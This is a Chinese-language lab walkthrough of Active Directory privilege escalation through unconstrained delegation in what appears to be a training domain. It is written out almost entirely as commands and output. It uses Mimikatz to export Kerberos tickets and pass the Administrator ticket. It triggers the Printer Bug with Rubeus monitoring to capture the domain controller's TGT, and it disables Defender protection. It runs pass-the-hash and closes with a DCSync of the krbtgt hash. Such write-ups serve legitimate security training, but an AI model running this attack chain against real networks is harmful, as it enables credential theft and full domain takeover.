横向到dcorp-appsrv，创建一个文件夹
```
PS C:\ad> Enter-PSSession $sess
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents> mkdir user366
```

用Mimikatz导出所有令牌，看看是否有Administrator的令牌
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::tickets /export

<略>

Authentication Id : 0 ; 3929288 (00000000:003bf4c8)
Session           : Network from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 2/15/2022 6:02:00 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 2/15/2022 6:02:00 AM ; 2/15/2022 4:02:00 PM ; 2/22/2022 6:02:00 AM
           Service Name (02) : krbtgt ; DOLLARCORP.MONEYCORP.LOCAL ; @ DOLLARCORP.MONEYCORP.LOCAL
           Target Name  (--) : @ DOLLARCORP.MONEYCORP.LOCAL
           Client Name  (01) : Administrator ; @ DOLLARCORP.MONEYCORP.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             2d67ea81d9628838bac1d03a94ecaa0ac1002bff18529deb112cf2238b7a6270
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi !
<略>
```

如果上面不能取得Administrator的令牌，在学生机器执行下面这条触发，然后再用mimikatz导一次
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

如果已经可以查看到Administrator令牌，复用Administrator令牌，取得DA权限
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user366\[0;30a513]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi

* File: 'C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK
```
执行成功！

测试我们现在是否有administrator权限，指定DC服务器执行whoami和hostname命令
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
dcorp\administrator
dcorp-dc
```

证明我们已经取得了DA权限


### 方法二（Printer Bug）


原理：MS-RPRN 有一项功能，允许任何域用户(已验证的用户)强制任何机器(后台运行了打印程序服务)连接到域用户选择的第二台机器，我们可以通过滥用Printer Bug错误来强制dcorp-dc连接到 dcorp-appsrv。

重新起一个appadmin的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```

起一个dcorp-appsrv的session
```
$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

把Rubeus.exe拷贝到dcorp-appsrv
```
Copy-Item -ToSession $sess -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin\Downloads
```

进到dcorp-appsrv，运行Rubeus.exe，这个shell不要关闭
```
PS C:\ad> copy-Item -ToSession $sess -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin\Downloads
PS C:\ad> Enter-PSSession $sess
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents> cd ..\Downloads\
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Downloads> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs


```



回到学生机，执行下面命令

```
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```


然后在dcorp-appsrv的Rubeus.exe里，就看到了DCORP-DC的TGT
```
[*] 2/15/2022 2:50:23 PM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
  StartTime             :  2/14/2022 10:34:09 PM
  EndTime               :  2/15/2022 8:34:09 AM
  RenewTill             :  2/21/2022 1:00:49 PM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFxTCCBcGgAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBDYwggQyoAMCARKhAwIBAqKCBCQEggQgAofkSfMEPDetluumsJMry8ARJfAlyE8EKnm7Qg91biW0Flc8LqiyPfntatLcWNEnFWZqoVKMfjWRBCpRd7Bye2qIe9B4QtnDstjJGWuUeJ/thMsxMxKMp00GGASK4iv2aEGK+ZUz5ElsiJr4MYenJUR3FMDZ8uHoHoFyT2O9OMYA02K2F4EJY1cV0kwl4y/vEsFFcQcp62f0sATOLB/Fuz0qT+ATCMzUBOHDB9/i2uvrp96dTEEU1VdC6cihYRXxsfNAala7lP+bkp3K2dkxH/Rf8z/vocdlY0c/lo01ZhBatGm0aOJTlFNLsv/7wLxDx/WS51iAx2Vd6ionLuwSwBI8CyaXn7U/72Lzj2I9TJs9p1eoN9UMvmAQga2Qtt1aVGGedmOZZcFVsvAwuLUaatPCS1UlwljMikVkCp150zJY2ECZXmlHWcpmIU5QaoWN3RGFqzvp/Ruavh2rEAkv5/NHL8p2uPJp3VcEy4kgaF3mVvFX4GxnAl/okWXyhwQJX4BZ3Tf6922qcpSGxGMsD9Y+t0JDE9JrVdO4sgVFZn/tEJ7rAR/81p4w6QgLX8yxW5tsJDm9uEyfsu2w67K3tWcew6pKNNJLqN4ZQO8NK6jmieOq5vxV6IL5mn/LAS6RVQf43FY7Oan0dPlnJoFaIDpJKVO49H1TsWkGJBt15oCN1u8Arq6wE8JIBEU+LAw/jV9dSSIRyE+oJ1juHr1+47nDOBijoOS+qbq7clKPHZl0RdVDD0H847xAvWznAQpNsZlSui1/I1zYRq2uOvKdHiOOoJQi+cUwD01yqGKqWdhjknY/dL4JYWr7n+tYBwh+5fxL2/85H8xnR2TDr1tB/v4G07WQzip/zUT8P0uChgRYk7A2ATRTUYrmKZ1bPLbmd45f8477n0EQvhfKpkEyP9Qos3SI6fNtJRHPaO0B+biOaZLcoIfdWIPLNzVGVnGXjHbq+1hp6Q4OI7gYeXsqEYBZpspSMbId2VimqG4Bh8XAtPthpOw0YzrGA+6ZOtjHQmdzcKJyl3Py7wBXjqzwOj0I4Dp8EXzgVTitx7gSlJRumfGxt4OBrnLyDcE6iG1KmAuEaStZEtavskUJVhG4qfwKMbyGC1eagfdGYyPyOryW4tF+tVajxZY6UFyjNWNKjQXYM/JFDTEtBrltCn8o8amN/MYxo2H1SWM9XdEt6REJ+dc65w/PErZYFQtjqiPf2jtHWUGfNoEOm/3FrwADCiadC3pVfeEM68wI/ur4lV8ykw8g8ptoK34hq82qjmzDSWyA36JaCVaeN9C7cDHSiGtJ8BcIu3vwOR1BBgwjGorxOLM4ZGKmkDgDzdVOrtjYcsN3fpU8Osnoer+tIwkN3JYWpKoDxHJtTxRd8nc3kcipN0EOW4g3KlOvMYBTbJBTo4IBFTCCARGgAwIBAKKCAQgEggEEfYIBADCB/aCB+jCB9zCB9KArMCmgAwIBEqEiBCAPS1nJ2B4uyJ290hWYJVnxp98hbHcAgvtupb4NlKIbuKEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCURDT1JQLURDJKMHAwUAYKEAAKURGA8yMDIyMDIxNTA2MzQwOVqmERgPMjAyMjAyMTUxNjM0MDlapxEYDzIwMjIwMjIxMjEwMDQ5WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=
```

怎么利用TGT？

利用命令：```.\Rubeus.exe ptt /ticket:<TGTofDCORP-DC$>```


导入成功

用klist命令查看ticket
```
[+] Ticket successfully imported!
PS C:\ad> klist

Current LogonId is 0:0x2a582

Cached Tickets: (1)

#0>     Client: DCORP-DC$ @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 2/14/2022 22:34:09 (local)
        End Time:   2/15/2022 8:34:09 (local)
        Renew Time: 2/21/2022 13:00:49 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

因为现在我们已经有了DA权限，可以使用dcsync导出dcorp\krbtgt的NTML哈希
```
PS C:\ad> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```